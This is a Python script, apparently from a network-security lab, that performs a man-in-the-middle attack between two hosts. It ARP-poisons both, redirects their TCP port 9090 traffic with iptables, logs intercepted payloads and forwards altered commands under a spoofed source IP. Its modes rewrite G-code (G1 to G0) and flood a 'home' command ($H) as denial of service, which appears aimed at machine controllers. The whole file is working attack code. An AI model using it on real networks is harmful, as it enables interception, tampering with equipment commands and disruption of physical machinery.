import socket, sys, os, signal, atexit, json, threading
from datetime import datetime
from scapy.all import *

print("MITM Proxy with Mode Selection, Enhanced Packet Logging, and IP Spoofing...")

# Get mode argument from command-line
if len(sys.argv) < 2:
    print("Usage: python3 xy_modify_mitm.py [xy | g1g0 | dos | default]")
    sys.exit(1)
mode = sys.argv[1].lower()

# Create a logs directory if it doesn't exist
LOG_DIR = "/volumes/logs/"
os.makedirs(LOG_DIR, exist_ok=True)
print(f"Log files will be saved in: {os.path.abspath(LOG_DIR)}")
        
def cleanup():
    """Cleanup logic for exit"""
    print("Cleaning up resources...")
    os.system("iptables -D INPUT -s 10.9.0.5 -p tcp --dport 9090 -j DROP 2>/dev/null")
    os.system("iptables -D FORWARD -s 10.9.0.5 -p tcp --dport 9090 -j DROP 2>/dev/null")

def signal_handler(sig, frame):
    """Signal Handler for graceful exit"""
    print("Interrupt received. Exiting gracefully...")
    sys.exit(0)

def setup_iptables():
    """Setup logic for IPtables"""
    print("Setting up iptables rules...")
    os.system("iptables -F")  # Flush all existing rules
    os.system("iptables -t nat -F")  # Flush NAT table rules
    os.system("killall -9 python3 2>/dev/null")  # Kill any other Python scripts that might be using the port
    time.sleep(1)  # Give system time to release resources
    
    # Enable IP forwarding (required for MITM)
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # Allow spoofed packets to be sent out
    os.system("echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter")
    os.system("echo 0 > /proc/sys/net/ipv4/conf/eth0/rp_filter")
    os.system("echo 0 > /proc/sys/net/ipv4/conf/default/rp_filter")
    
    # Capture packets from HostA to HostB
    os.system("iptables -t nat -A PREROUTING -s 10.9.0.5 -d 10.9.0.6 -p tcp --dport 9090 -j REDIRECT --to-port 9091")
    
    # Make sure we don't block our own traffic
    os.system("iptables -A INPUT -p tcp --dport 9091 -j ACCEPT")
    
    print("Iptables setup complete")

def log_packet_details(packet_data, is_original=True, src_ip="unknown", dst_ip="unknown", src_port=0, dst_port=0):
    """Unified logging function for both sniffed and intercepted packets"""
    try:
        # Initialize common fields
        flags = ""
        seq = 0
        ack = 0
        window = 0
        header_length = 0
        payload = ""

        # If packet_data is a Scapy packet
        if isinstance(packet_data, Packet) and IP in packet_data and TCP in packet_data:
            src_ip = packet_data[IP].src
            dst_ip = packet_data[IP].dst
            src_port = packet_data[TCP].sport
            dst_port = packet_data[TCP].dport
            flags = str(packet_data[TCP].flags)
            seq = packet_data[TCP].seq
            ack = packet_data[TCP].ack
            window = packet_data[TCP].window
            header_length = packet_data[TCP].dataofs * 4
            if Raw in packet_data:
                payload = packet_data[Raw].load.decode(errors='ignore').strip()

        # If it's a decoded string payload
        elif isinstance(packet_data, str):
            payload = packet_data.strip()

        # If it's bytes, decode it
        elif isinstance(packet_data, bytes):
            payload = packet_data.decode(errors='ignore').strip()

        # Final log entry
        log_data = {
            "timestamp": datetime.utcnow().isoformat(),
            "packet_type": "Original" if is_original else "Modified",
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "src_port": src_port,
            "dst_port": dst_port,
            "flags": flags,
            "seq": seq,
            "ack": ack,
            "window": window,
            "tcp_header_length": header_length,
            "payload_length": len(payload),
            "payload": payload
        }

        # Write to log file
        log_filename = os.path.join(LOG_DIR, f"packet_log_{datetime.now().strftime('%Y-%m-%d_%H')}.json")
        with open(log_filename, "a") as logfile:
            logfile.write(json.dumps(log_data) + "\n")
            logfile.flush()

        print(f"[{log_data['packet_type']} PACKET] {src_ip}:{src_port} -> {dst_ip}:{dst_port} | Payload: {payload[:50]}...")
        print(f"Log saved to: {log_filename}")

    except Exception as e:
        print(f"Error logging packet details: {e}")
        print(f"Attempted to write to: {os.path.join(LOG_DIR, 'packet_log.json')}")


def forward_original_packet(src_ip, src_port, dst_ip, dst_port, payload):
    """Forward the packet with original source IP but using normal socket
    This method uses a standard socket but configures iptables to rewrite the source.
    """
    try:
        # Set up source NAT rule to make outgoing connections appear from the original client
        os.system(f"iptables -t nat -A POSTROUTING -s {get_local_ip()} -d {dst_ip} -p tcp --dport {dst_port} -j SNAT --to-source {src_ip}")

        # Create a standard socket connection (which will be source-NATed)
        forward_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Set socket timeout
        forward_sock.settimeout(5)
        
        # Connect to destination
        try:
            forward_sock.connect((dst_ip, dst_port))
            forward_sock.send(payload)
            print(f"Sent packet with SNAT from {src_ip}:{src_port} to {dst_ip}:{dst_port}")
            
            # Optional: Wait for response
            try:
                response = forward_sock.recv(4096)
                print(f"Received response: {response.decode(errors='ignore')[:50]}...")
            except socket.timeout:
                print("No response received (timeout)")
            
            forward_sock.close()
            
            # Remove the SNAT rule we added
            os.system(f"iptables -t nat -D POSTROUTING -s {get_local_ip()} -d {dst_ip} -p tcp --dport {dst_port} -j SNAT --to-source {src_ip}")
            return True
        except Exception as e:
            print(f"Socket error: {e}")
            # Make sure to remove the rule if we failed
            os.system(f"iptables -t nat -D POSTROUTING -s {get_local_ip()} -d {dst_ip} -p tcp --dport {dst_port} -j SNAT --to-source {src_ip}")
            return False
            
    except Exception as e:
        print(f"Error forwarding packet: {e}")
        return False

def get_local_ip():
    """Get the local IP address of the interface"""
    try:
        # Create a socket to determine local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Doesn't actually send anything
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        # Fallback method if the above fails
        return conf.iface

def send_spoofed_packet(src_ip, src_port, dst_ip, dst_port, payload, seq=0, ack=0):
    """Send a packet with spoofed source IP and port using Scapy
    This is kept for reference but not used as primary method
    """
    try:
        # Create a complete TCP/IP packet with spoofed source
        ip_layer = IP(src=src_ip, dst=dst_ip)
        tcp_layer = TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq, ack=ack)
        
        # Add the payload
        packet = ip_layer/tcp_layer/Raw(load=payload)
        
        # Send the packet
        send(packet, verbose=0)
        print(f"Sent spoofed packet from {src_ip}:{src_port} to {dst_ip}:{dst_port}")
        return True
    except Exception as e:
        print(f"Error sending spoofed packet: {e}")
        return False

def receive_and_modify():
    """Receive & Modify Packet"""
    # Create a socket to listen for redirected traffic
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 9091))
    sock.listen(5)
    print("Listening for redirected traffic on port 9091...")
    
    while True:
        client_sock, addr = sock.accept()
        client_port = addr[1]
        print(f"\nConnection from {addr}")
        
        # Read data from the connection
        data = client_sock.recv(4096)
        if not data:
            client_sock.close()
            continue
        
        try:
            # Decode and log the original payload
            payload = data.decode(errors='ignore').strip()
            print(f"Intercepted: {payload}")
            
            # Log original packet details
            log_packet_details(
                packet_data=payload, 
                is_original=True,
                src_ip="10.9.0.5",
                dst_ip="10.9.0.6",
                src_port=client_port,
                dst_port=9090
            )
            
            ### MITM MODIFICATION ###
            if mode == "xy":
                # Replace X with Y if present
                if 'X' in payload:
                    modified_payload = payload.replace('X', 'Y')
                    modified_data = (modified_payload + '\n').encode()
                    print(f"Modified: X → Y")
                    print(f"Forwarding to HostB: {modified_payload}")
                else:
                    modified_data = data
                    modified_payload = payload
                    print("No modification needed (no X found)")
                    print(f"Forwarding to HostB: {modified_payload}")

            elif mode == "g1g0":
                # Replace G1 with G0 if present
                if 'G1' in payload:
                    modified_payload = payload.replace('G1', 'G0')
                    modified_data = (modified_payload + '\n').encode()
                    print(f"Modified: G1 → G0")
                    print(f"Forwarding Modified Payload to HostB: {modified_payload}")
                else:
                    modified_data = data
                    modified_payload = payload
                    print("No modification needed (no G1 found)")
                    print(f"Forwarding Original Payload to HostB: {payload}")

            elif mode == "dos":
                # DoS by send Home Command for all packets
                modified_payload = f"$H\n"
                modified_data = modified_payload.encode()
                print(f"Initiating DoS Command: $H")
                print(f"Forwarding to HostB: {modified_payload}")
                
            elif mode == "default":
                # For now, just pass (no modification)                
                modified_payload = f"[MODIFIED] {payload}\n"
                modified_data = modified_payload.encode()
                print(f"Forwarding to HostB: {modified_payload}")
                
            else:
                print(f"Unknown mode: {mode}")
                sys.exit(1)
            
            # Log the modified packet details
            log_packet_details(
                packet_data=modified_payload,
                is_original=False,
                src_ip="10.9.0.5",  # We want to spoof this as the original source
                dst_ip="10.9.0.6",
                src_port=client_port,
                dst_port=9090
            )
            
            # Method 1: Use SNAT with iptables for proper TCP state management
            # This is more reliable as it preserves TCP connection state
            forward_success = forward_original_packet(
                src_ip="10.9.0.5",  # Original source (HostA)
                src_port=client_port,
                dst_ip="10.9.0.6",  # Destination (HostB)
                dst_port=9090,
                payload=modified_data
            )
            
            if forward_success:
                print(f"Successfully forwarded modified packet to HostB appearing from HostA")
            else:
                print(f"Failed to forward packet, falling back to direct method")
                
                # Method 2 (Fallback): Try using Scapy for raw packet sending
                # This might not work because of TCP state issues but kept as backup
                send_success = send_spoofed_packet(
                    src_ip="10.9.0.5",  # Spoof as HostA
                    src_port=client_port,
                    dst_ip="10.9.0.6",  # Send to HostB
                    dst_port=9090,
                    payload=modified_data
                )
                
                if send_success:
                    print(f"Sent spoofed packet using raw method (may not be received correctly)")
                else:
                    print(f"Failed to send spoofed packet with both methods")
            
            # Clean up
            client_sock.close()
            
        except Exception as e:
            print(f"Error processing connection: {e}\n")
            client_sock.close()

def sniff_packet_callback(packet):
    if IP in packet and TCP in packet:
        log_packet_details(packet_data=packet)

def run_arp_poison():
    """Run continual ARP spoofing to maintain position between victim and target"""
    victim_ip = "10.9.0.5"  # HostA
    target_ip = "10.9.0.6"  # HostB
    
    # Get MAC addresses
    victim_mac = getmacbyip(victim_ip)
    target_mac = getmacbyip(target_ip)
    attacker_mac = get_if_hwaddr(conf.iface)
    
    print(f"[*] Starting ARP spoofing attack...")
    print(f"[*] Victim (HostA): {victim_ip} [{victim_mac}]")
    print(f"[*] Target (HostB): {target_ip} [{target_mac}]")
    print(f"[*] Attacker: {conf.iface} [{attacker_mac}]")
    
    # Function for continuous ARP poisoning
    def poison_targets():
        while True:
            try:
                # Tell victim that we are the target
                send(ARP(op=2, pdst=victim_ip, psrc=target_ip, hwdst=victim_mac, hwsrc=attacker_mac), verbose=0)
                
                # Tell target that we are the victim
                send(ARP(op=2, pdst=target_ip, psrc=victim_ip, hwdst=target_mac, hwsrc=attacker_mac), verbose=0)
                
                # Small delay between sends
                time.sleep(2)
                
            except Exception as e:
                print(f"[!] Error in ARP poisoning: {e}")
                time.sleep(1)
    
    # Start ARP poisoning in a separate thread
    arp_thread = threading.Thread(target=poison_targets, daemon=True)
    arp_thread.start()
    print("[*] ARP spoofing attack started")
    
    return arp_thread

def start_sniffer():
    """Start a background sniffer on TCP port 9090"""
    print("Starting packet sniffer on port 9090...")
    sniff(filter="tcp port 9090", prn=sniff_packet_callback, store=0)

def main():
    # Make sure we have root privileges
    if os.geteuid() != 0:
        print("[!] This script must be run as root!")
        sys.exit(1)

    print("Starting real-time TCP MITM with advanced IP spoofing...")
    print(f"Log directory: {os.path.abspath(LOG_DIR)}")
    print(f"Running in {mode.upper()} mode")

    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    setup_iptables()

    try:
        # Check connectivity to both hosts
        print("\n[*] Testing connectivity to hosts...")
        host_a_reachable = os.system(f"ping -c 1 10.9.0.5 >/dev/null 2>&1") == 0
        host_b_reachable = os.system(f"ping -c 1 10.9.0.6 >/dev/null 2>&1") == 0
        
        if not host_a_reachable:
            print("[!] Warning: Cannot reach HostA (10.9.0.5)")
        if not host_b_reachable:
            print("[!] Warning: Cannot reach HostB (10.9.0.6)")
        
        # Start ARP spoofing in a separate thread
        arp_thread = run_arp_poison()

        # Start sniffer in background thread
        sniffer_thread = threading.Thread(target=start_sniffer, daemon=True)
        sniffer_thread.start()

        # Start intercepting and modifying packets
        print("\n[*] Starting packet interception...")
        receive_and_modify()
    except KeyboardInterrupt:
        print("\nStopping...")
    except Exception as e:
        print(f"\n[!] Error in main execution: {e}")
    finally:
        print("\nRestoring network state...")
        
        # Restore normal ARP tables before exiting
        victim_ip = "10.9.0.5"
        target_ip = "10.9.0.6"
        victim_mac = getmacbyip(victim_ip)
        target_mac = getmacbyip(target_ip)
        
        print("[*] Restoring ARP tables...")
        try:
            # Send correct ARP information to both hosts
            send(ARP(op=2, pdst=victim_ip, psrc=target_ip, hwdst=victim_mac, hwsrc=target_mac), count=5, verbose=0)
            send(ARP(op=2, pdst=target_ip, psrc=victim_ip, hwdst=target_mac, hwsrc=victim_mac), count=5, verbose=0)
        except Exception as e:
            print(f"[!] Error restoring ARP tables: {e}")
        
        # Reset IP forwarding and rp_filter to default
        try:
            print("[*] Resetting kernel parameters...")
            os.system("echo 1 > /proc/sys/net/ipv4/conf/all/rp_filter")
            os.system("echo 1 > /proc/sys/net/ipv4/conf/eth0/rp_filter")
            os.system("echo 1 > /proc/sys/net/ipv4/conf/default/rp_filter")
        except Exception as e:
            print(f"[!] Error resetting kernel parameters: {e}")
        
        # Clean up iptables
        try:
            print("[*] Cleaning up iptables rules...")
            os.system("iptables -F")
            os.system("iptables -t nat -F")
        except Exception as e:
            print(f"[!] Error cleaning up iptables: {e}")
            
        print("[*] MITM session terminated")

if __name__ == "__main__":
    main()
